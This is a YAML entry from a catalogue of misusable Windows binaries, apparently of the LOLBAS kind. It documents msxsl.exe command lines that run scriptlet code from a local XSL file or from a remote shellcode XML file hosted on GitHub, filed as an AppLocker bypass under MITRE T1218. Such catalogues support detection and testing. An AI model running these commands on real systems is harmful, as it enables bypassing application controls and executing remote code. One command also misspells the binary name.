---
name: msxsl.exe
description: Command line utility used to perform XSL transformations.
functions:
  execute:
    - description: Run COM Scriptlet code within the script.xsl file (local).
      code: msxsl.exe customers.xml script.xsl
      mitreid: T1218
      mitrelink: https://attack.mitre.org/wiki/Technique/T1218
      operatingsystem: Windows
      privileges: User
      usecase: Local execution of script stored in XSL file.
    - description: Run COM Scriptlet code within the shellcode.xml(xsl) file (remote).
      code: msxls.exe https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml
      mitreid: T1218
      mitrelink: https://attack.mitre.org/wiki/Technique/T1218
      operatingsystem: Windows
      privileges: User
      usecase: Local execution of remote script stored in XSL script stored as an XML file.
  awl bypass:
    - description: Run COM Scriptlet code within the script.xsl file (local).
      code: msxsl.exe customers.xml script.xsl
      mitreid: T1218
      mitrelink: https://attack.mitre.org/wiki/Technique/T1218
      operatingsystem: Windows
      privileges: User
      usecase: Local execution of script stored in XSL file.
    - description: Run COM Scriptlet code within the shellcode.xml(xsl) file (remote).
      code: msxls.exe https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml
      mitreid: T1218
      mitrelink: https://attack.mitre.org/wiki/Technique/T1218
      operatingsystem: Windows
      privileges: User
      usecase: Local execution of remote script stored in XSL script stored as an XML file.
resources:
    - resource: https://twitter.com/subTee/status/877616321747271680
    - resource: https://github.com/3gstudent/Use-msxsl-to-bypass-AppLocker
fullpath:
    - path: 
detection:
  - IOC: 
acknowledgement:
  - Person: Casey Smith
    Handle: '@subtee'
---
